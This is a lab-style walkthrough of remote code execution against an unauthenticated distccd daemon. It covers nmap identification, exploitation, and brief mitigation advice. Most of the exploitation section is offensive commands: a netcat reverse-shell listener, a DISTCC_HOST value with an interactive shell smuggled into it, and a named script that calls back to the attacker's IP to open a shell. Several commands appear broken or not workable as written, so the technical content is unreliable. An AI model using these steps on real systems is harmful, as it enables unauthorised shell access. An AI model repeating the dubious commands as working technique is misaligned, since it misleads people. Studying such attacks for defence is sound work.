Full Walkthrough: distccd RCE
Theory & Background
distccd is a program for distributed compilation of C/C++ code across several machines. A critical misconfiguration is running the daemon without any authentication (--allow 0.0.0.0), allowing anyone to connect and submit compilation jobs. An attacker can abuse this to execute arbitrary commands on the system.

Step-by-Step Walkthrough
1. Identification
bash
nmap -p3632 -sV <target_ip>
Expected Result: Nmap will show the port as open and identify the service as distccd.

2. Exploitation
The exploitation involves tricking distccd into compiling and executing a malicious command.

bash
# 1. Use a dedicated exploit script (the most reliable method)
# Search for 'distccd' exploit in metasploit or searchsploit

# 2. Manual method using netcat
# On your machine, set up a listener for a reverse shell: nc -nlvp 4444

# Connect to distccd and instruct it to run a command that connects back to you.
echo -e 'hello\n' | nc -nv <target_ip> 3632
# This might not work on all versions. Using a known exploit is better.

# 3. Using the known technique with distcc
# This assumes you have distcc installed on your attacking machine.
DISTCC_HOST='<target_ip> bash -c "exec /bin/sh -i <&2 1>&2" 2<>/dev/null' distcc whatever_command
# A more common and reliable way is with this python command:
distccd_rce.py <target_ip> 3632 <your_ip> 4444
What to do: If successful, you will receive a reverse shell connection on your listener. Run id to confirm your user (often daemon or distcc).

3. Mitigation
Access Control: Never use --allow 0.0.0.0/0. Restrict the daemon to only trusted compiler worker IPs using the --allow option (e.g., --allow 192.168.1.0/24).

Firewall: Use a host-based firewall to block port 3632 from untrusted networks.

Service Removal: If distributed compilation is not needed, disable and remove the distccd service entirely.

